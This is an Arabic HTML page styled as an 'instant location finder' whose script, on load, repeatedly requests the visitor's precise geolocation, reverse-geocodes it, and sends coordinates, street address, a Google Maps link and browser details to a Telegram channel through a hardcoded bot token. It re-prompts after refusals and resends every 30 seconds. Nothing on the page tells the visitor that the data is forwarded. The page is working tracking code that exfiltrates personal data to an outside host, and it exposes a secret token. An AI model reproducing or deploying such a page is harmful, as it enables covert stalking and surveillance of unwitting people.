<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الموقع الفوري</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a0b2e 50%, #0a0a0f 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        /* خلفية نيون متحركة */
        .neon-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        .neon-circle {
            position: absolute;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(155, 48, 255, 0.3) 0%, transparent 70%);
            filter: blur(50px);
            animation: float 10s infinite ease-in-out;
        }

        .neon-circle:nth-child(1) {
            top: 10%;
            left: 10%;
            background: radial-gradient(circle, rgba(255, 48, 255, 0.3) 0%, transparent 70%);
            animation-delay: 0s;
        }

        .neon-circle:nth-child(2) {
            bottom: 10%;
            right: 10%;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(123, 31, 162, 0.4) 0%, transparent 70%);
            animation-delay: 3s;
        }

        .neon-circle:nth-child(3) {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(103, 58, 183, 0.2) 0%, transparent 70%);
            animation-delay: 6s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(5%, 5%) scale(1.1); }
            50% { transform: translate(-5%, 2%) scale(0.9); }
            75% { transform: translate(-2%, -5%) scale(1.05); }
        }

        .container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 700px;
            padding: 20px;
        }

        /* الكارد الرئيسي */
        .main-card {
            background: rgba(10, 10, 20, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 2px solid rgba(155, 48, 255, 0.5);
            border-radius: 40px;
            padding: 50px 40px;
            box-shadow: 0 0 50px rgba(155, 48, 255, 0.5),
                        inset 0 0 30px rgba(155, 48, 255, 0.3);
            animation: cardGlow 3s infinite alternate;
            text-align: center;
        }

        @keyframes cardGlow {
            0% { box-shadow: 0 0 50px rgba(155, 48, 255, 0.3), inset 0 0 30px rgba(155, 48, 255, 0.2); }
            100% { box-shadow: 0 0 80px rgba(255, 48, 255, 0.7), inset 0 0 50px rgba(155, 48, 255, 0.4); }
        }

        h1 {
            color: #fff;
            text-align: center;
            font-size: 2.5em;
            font-weight: 900;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #9b30ff,
                         0 0 20px #9b30ff,
                         0 0 40px #ff00ff;
            letter-spacing: 2px;
            animation: textGlow 2s infinite alternate;
        }

        @keyframes textGlow {
            from { text-shadow: 0 0 10px #9b30ff, 0 0 20px #9b30ff, 0 0 30px #ff00ff; }
            to { text-shadow: 0 0 20px #ff00ff, 0 0 40px #9b30ff, 0 0 60px #ff00ff; }
        }

        /* الدائرة ثلاثية الأبعاد المتطورة */
        .loader-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 50px 0;
            position: relative;
            min-height: 300px;
        }

        /* دوائر متعددة ثلاثية الأبعاد */
        .circle-3d-1, .circle-3d-2, .circle-3d-3 {
            position: absolute;
            border-radius: 50%;
            border: 3px solid transparent;
            animation: rotate3D 3s infinite linear;
        }

        .circle-3d-1 {
            width: 220px;
            height: 220px;
            border-top-color: #ff00ff;
            border-bottom-color: #9b30ff;
            border-left-color: transparent;
            border-right-color: transparent;
            box-shadow: 0 0 30px #ff00ff,
                        0 0 60px #9b30ff;
            animation: rotate3D 4s infinite linear;
        }

        .circle-3d-2 {
            width: 280px;
            height: 280px;
            border-top-color: #00ffff;
            border-bottom-color: #ff00ff;
            border-left-color: transparent;
            border-right-color: transparent;
            box-shadow: 0 0 30px #00ffff,
                        0 0 60px #ff00ff;
            animation: rotate3D 6s infinite linear reverse;
        }

        .circle-3d-3 {
            width: 180px;
            height: 180px;
            border-top-color: #ffff00;
            border-bottom-color: #ff00ff;
            border-left-color: transparent;
            border-right-color: transparent;
            box-shadow: 0 0 30px #ffff00,
                        0 0 60px #ff00ff;
            animation: rotate3D 5s infinite linear;
        }

        @keyframes rotate3D {
            0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
            100% { transform: rotateX(360deg) rotateY(180deg) rotateZ(360deg); }
        }

        .circle-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            font-size: 1.8em;
            font-weight: 900;
            text-align: center;
            text-shadow: 0 0 20px #fff,
                         0 0 40px #9b30ff,
                         0 0 60px #ff00ff;
            width: 300px;
            z-index: 20;
            background: rgba(0, 0, 0, 0.4);
            padding: 20px 30px;
            border-radius: 60px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(10px);
            letter-spacing: 2px;
            animation: textPulse 2s infinite alternate;
        }

        @keyframes textPulse {
            from { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
            to { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
        }

        /* رسالة الحالة المتطورة */
        .status-container {
            margin-top: 40px;
            padding: 20px;
            border-radius: 30px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(155, 48, 255, 0.3);
        }

        .status-message {
            padding: 20px;
            border-radius: 20px;
            text-align: center;
            font-weight: 700;
            font-size: 1.3em;
            display: none;
            animation: slideInUp 0.5s ease;
            word-break: break-word;
            backdrop-filter: blur(5px);
        }

        @keyframes slideInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-message.success {
            background: rgba(0, 255, 0, 0.15);
            border: 2px solid #00ff00;
            color: #00ff00;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            display: block;
        }

        .status-message.error {
            background: rgba(255, 0, 0, 0.15);
            border: 2px solid #ff0000;
            color: #ff0000;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
            display: block;
        }

        .status-message.info {
            background: rgba(155, 48, 255, 0.15);
            border: 2px solid #9b30ff;
            color: #fff;
            box-shadow: 0 0 30px rgba(155, 48, 255, 0.3);
            display: block;
        }

        .status-message.warning {
            background: rgba(255, 165, 0, 0.15);
            border: 2px solid #ffa500;
            color: #ffa500;
            box-shadow: 0 0 30px rgba(255, 165, 0, 0.3);
            display: block;
        }

        /* مؤشر التحميل النصي */
        .loading-dots {
            display: inline-block;
        }

        .loading-dots::after {
            content: '.';
            animation: dots 1.5s infinite;
            font-size: 1.5em;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        /* جسيمات متحركة */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 5;
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: #ff00ff;
            border-radius: 50%;
            box-shadow: 0 0 15px #ff00ff, 0 0 30px #9b30ff;
            animation: particleFloat 8s infinite linear;
        }

        @keyframes particleFloat {
            0% { transform: translateY(100vh) scale(1); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) scale(0); opacity: 0; }
        }

        /* عداد الخطوات */
        .step-counter {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 30px;
        }

        .step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #9b30ff;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .step.active {
            background: #9b30ff;
            box-shadow: 0 0 30px #9b30ff;
            transform: scale(1.2);
        }

        .step.completed {
            background: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 30px #00ff00;
        }

        /* تذييل */
        .footer-note {
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 30px;
            font-size: 1em;
            text-shadow: 0 0 10px #9b30ff;
        }

        /* إحصائيات سريعة */
        .quick-stats {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9em;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .stat-value {
            color: #ff00ff;
            font-weight: bold;
            text-shadow: 0 0 10px #ff00ff;
        }
    </style>
</head>
<body>
    <!-- خلفية نيون -->
    <div class="neon-background">
        <div class="neon-circle"></div>
        <div class="neon-circle"></div>
        <div class="neon-circle"></div>
    </div>

    <!-- جسيمات متحركة -->
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="main-card">
            <h1>⚡ نـظام تـحديد المـوقع الفـوري ⚡</h1>
            
            <!-- الدوائر ثلاثية الأبعاد المتطورة -->
            <div class="loader-container">
                <div class="circle-3d-1"></div>
                <div class="circle-3d-2"></div>
                <div class="circle-3d-3"></div>
                <div class="circle-text" id="mainText">
                    جـاري التحميل<span class="loading-dots"></span>
                </div>
            </div>

            <!-- عداد الخطوات -->
            <div class="step-counter" id="stepCounter">
                <div class="step" id="step1">1</div>
                <div class="step" id="step2">2</div>
                <div class="step" id="step3">3</div>
                <div class="step" id="step4">4</div>
            </div>

            <!-- رسالة الحالة المتطورة -->
            <div class="status-container">
                <div class="status-message" id="statusMessage">
                    جـاري تـحضير النظام...
                </div>
            </div>

            <!-- إحصائيات سريعة -->
            <div class="quick-stats">
                <div class="stat-item">
                    <span>⚡ الحالة:</span>
                    <span class="stat-value" id="statusText">جاري الاتصال</span>
                </div>
                <div class="stat-item">
                    <span>🕒 الوقت:</span>
                    <span class="stat-value" id="timeText">00:00</span>
                </div>
            </div>

            <div class="footer-note">
                🔮 نـظام متطور يعمل تلقائياً - لا حاجة لإدخال بيانات 🔮
            </div>
        </div>
    </div>

    <script>
        // إعدادات تيليجرام
        const TELEGRAM_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
        const CHANNEL_ID = '-1003875161698';
        
        // متغيرات للتحكم
        let startTime = Date.now();
        let attemptCount = 0;
        const MAX_ATTEMPTS = 3;

        // إنشاء الجسيمات المتحركة
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 5 + 's';
                particle.style.animationDuration = (5 + Math.random() * 5) + 's';
                particlesContainer.appendChild(particle);
            }
        }

        // تحديث الوقت
        function updateTime() {
            const now = new Date();
            const timeString = now.toLocaleTimeString('ar-EG', { 
                hour: '2-digit', 
                minute: '2-digit',
                second: '2-digit'
            });
            document.getElementById('timeText').textContent = timeString;
        }

        // تحديث الخطوات
        function updateStep(step, status) {
            const stepElement = document.getElementById(`step${step}`);
            stepElement.classList.remove('active', 'completed');
            stepElement.classList.add(status);
        }

        // تحديث النص الرئيسي
        function updateMainText(text, isError = false) {
            const mainText = document.getElementById('mainText');
            mainText.innerHTML = text;
            if (isError) {
                mainText.style.color = '#ff0000';
                mainText.style.textShadow = '0 0 20px #ff0000';
            } else {
                mainText.style.color = '#fff';
                mainText.style.textShadow = '0 0 20px #fff, 0 0 40px #9b30ff';
            }
        }

        // دالة إرسال الرسالة إلى تيليجرام
        async function sendToTelegram(message, retryCount = 0) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHANNEL_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                console.log('Telegram response:', data);
                
                if (data.ok) {
                    return true;
                } else {
                    if (retryCount < 3) {
                        console.log(`Retrying... Attempt ${retryCount + 1}`);
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        return sendToTelegram(message, retryCount + 1);
                    }
                    return false;
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                if (retryCount < 3) {
                    console.log(`Retrying... Attempt ${retryCount + 1}`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    return sendToTelegram(message, retryCount + 1);
                }
                return false;
            }
        }

        // دالة الحصول على معلومات الموقع
        async function getDetailedLocation(position) {
            const { latitude, longitude, accuracy } = position.coords;
            
            // محاولة الحصول على العنوان
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'LocationFinder/1.0'
                    }
                });
                const data = await response.json();
                
                let address = data.display_name || 'غير متوفر';
                let city = data.address?.city || data.address?.town || data.address?.village || data.address?.county || 'غير معروفة';
                let country = data.address?.country || 'غير معروف';
                let state = data.address?.state || data.address?.region || '';
                
                return {
                    latitude,
                    longitude,
                    accuracy,
                    address,
                    city,
                    country,
                    state
                };
            } catch (error) {
                console.error('Error getting address:', error);
                return {
                    latitude,
                    longitude,
                    accuracy,
                    address: 'غير متوفر',
                    city: 'غير معروفة',
                    country: 'غير معروف',
                    state: ''
                };
            }
        }

        // دالة بدء عملية تحديد الموقع التلقائية
        async function startAutomaticLocationProcess() {
            updateStep(1, 'active');
            updateMainText('جـاري طلب الإذن<span class="loading-dots"></span>');
            showStatus('🔄 جاري طلب إذن الوصول إلى الموقع... الرجاء الانتظار', 'info');
            
            // التحقق من دعم المتصفح
            if (!navigator.geolocation) {
                handleError('المتصفح لا يدعم خاصية تحديد الموقع');
                return;
            }

            // محاولة الحصول على الموقع مع إعادة المحاولة
            attemptCount = 0;
            tryLocationRequest();
        }

        async function tryLocationRequest() {
            attemptCount++;
            updateStep(2, 'active');
            updateMainText('جـاري تحديد الموقع<span class="loading-dots"></span>');
            showStatus(`📍 محاولة تحديد الموقع... (المحاولة ${attemptCount}/${MAX_ATTEMPTS})`, 'info');

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // نجاح تحديد الموقع
                    updateStep(2, 'completed');
                    updateStep(3, 'active');
                    updateMainText('جـاري معالجة البيانات<span class="loading-dots"></span>');
                    showStatus('✅ تم تحديد الموقع بنجاح! جاري معالجة المعلومات...', 'success');
                    
                    // الحصول على المعلومات التفصيلية
                    const locationInfo = await getDetailedLocation(position);
                    
                    updateStep(3, 'completed');
                    updateStep(4, 'active');
                    updateMainText('جـاري الإرسال للقناة<span class="loading-dots"></span>');
                    showStatus('📤 جاري إرسال المعلومات إلى القناة...', 'info');
                    
                    // إنشاء رسالة منسقة
                    const message = `
🚨 <b>تحديث فوري - تم تحديد موقع جديد</b> 🚨

📍 <b>معلومات الموقع:</b>
━━━━━━━━━━━━━━━
🌐 <b>خط العرض:</b> ${locationInfo.latitude}
🌐 <b>خط الطول:</b> ${locationInfo.longitude}
🎯 <b>الدقة:</b> ${Math.round(locationInfo.accuracy)} متر

🏙️ <b>المدينة:</b> ${locationInfo.city}
🗺️ <b>المنطقة:</b> ${locationInfo.state || 'غير متوفر'}
🌍 <b>البلد:</b> ${locationInfo.country}

📍 <b>العنوان:</b>
${locationInfo.address}

🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}

🔗 <b>رابط خرائط جوجل:</b>
https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}

📱 <b>معلومات إضافية:</b>
• نوع المتصفح: ${navigator.userAgent}
• اللغة: ${navigator.language}
• النظام: ${navigator.platform}

━━━━━━━━━━━━━━━
⚡ <b>تم التحديد تلقائياً</b> ⚡
                    `;
                    
                    // إرسال إلى تيليجرام
                    const sent = await sendToTelegram(message);
                    
                    if (sent) {
                        updateStep(4, 'completed');
                        updateMainText('✅ تم الإرسال بنجاح');
                        showStatus(`
✅ <b>تم إرسال الموقع بنجاح إلى القناة!</b>

📍 الموقع: ${locationInfo.latitude}, ${locationInfo.longitude}
🏙️ المدينة: ${locationInfo.city}
🌍 البلد: ${locationInfo.country}
🎯 الدقة: ${Math.round(locationInfo.accuracy)} متر

🔗 رابط الخريطة:
https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}
                        `, 'success');
                        
                        // إرسال رابط منفصل
                        await sendToTelegram(`📍 <b>رابط الموقع المباشر:</b> https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`);
                        
                        // إعادة تشغيل العملية بعد 30 ثانية
                        setTimeout(() => {
                            resetAndRestart();
                        }, 30000);
                    } else {
                        handleError('فشل إرسال المعلومات إلى القناة');
                    }
                },
                (error) => {
                    // معالجة الأخطاء
                    let errorMessage = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'تم رفض الإذن. يرجى السماح بالوصول إلى الموقع';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'معلومات الموقع غير متوفرة';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'انتهت المهلة';
                            break;
                        default:
                            errorMessage = 'خطأ غير معروف';
                    }
                    
                    if (attemptCount < MAX_ATTEMPTS) {
                        // إعادة المحاولة
                        updateMainText(`⚠️ إعادة المحاولة ${attemptCount + 1}/${MAX_ATTEMPTS}`);
                        showStatus(`⚠️ ${errorMessage} - جاري إعادة المحاولة...`, 'warning');
                        setTimeout(tryLocationRequest, 2000);
                    } else {
                        handleError(`فشل تحديد الموقع بعد ${MAX_ATTEMPTS} محاولات: ${errorMessage}`);
                    }
                },
                options
            );
        }

        function handleError(message) {
            updateMainText('❌ فشل التحديد', true);
            showStatus(`❌ ${message}`, 'error');
            
            // إعادة المحاولة بعد 10 ثواني
            setTimeout(() => {
                resetAndRestart();
            }, 10000);
        }

        function resetAndRestart() {
            // إعادة تعيين كل شيء
            for (let i = 1; i <= 4; i++) {
                document.getElementById(`step${i}`).classList.remove('active', 'completed');
            }
            startAutomaticLocationProcess();
        }

        function showStatus(message, type) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.className = `status-message ${type}`;
            statusMessage.innerHTML = message.replace(/\n/g, '<br>');
            
            // تحديث النص في الإحصائيات
            document.getElementById('statusText').textContent = 
                type === 'success' ? 'تم بنجاح' : 
                type === 'error' ? 'خطأ' : 
                type === 'warning' ? 'تحذير' : 'جاري التنفيذ';
        }

        // تهيئة الصفحة
        window.onload = function() {
            createParticles();
            
            // تحديث الوقت كل ثانية
            setInterval(updateTime, 1000);
            updateTime();
            
            // بدء العملية التلقائية بعد ثانيتين
            setTimeout(() => {
                startAutomaticLocationProcess();
            }, 2000);
        };
    </script>
</body>
</html>
